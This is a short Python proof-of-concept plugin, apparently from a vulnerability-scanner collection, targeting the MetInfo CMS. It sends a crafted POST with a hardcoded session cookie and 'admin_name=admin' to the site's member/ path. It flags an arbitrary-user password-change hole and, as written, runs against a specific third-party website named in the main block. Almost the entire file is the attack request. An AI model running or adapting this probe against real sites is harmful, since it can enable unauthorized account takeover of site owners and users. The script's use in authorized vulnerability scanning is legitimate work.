#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0121863

def assign(service, arg):
    if service == "metinfo":
        return True, arg
      
def audit(arg):
    url = arg + 'member/'
    cookie = 'Cookie: PHPSESSID=9be0lkppmei08qedn56funvje0; CNZZDATA1670348=cnzz_eid%3D24422845-1444377232-%26ntime%3D1444377232' 
    data = 'admin_name=admin&Submit=+%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81+'
    code, head,res, errcode, _ = curl.curl2(url,cookie = cookie,data = data)
    if code == 200 and 'index_member.php?lang=cn' in res :
        security_hole(url + "   :任意用户密码修改")    

if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://www.topxon.com/')[1])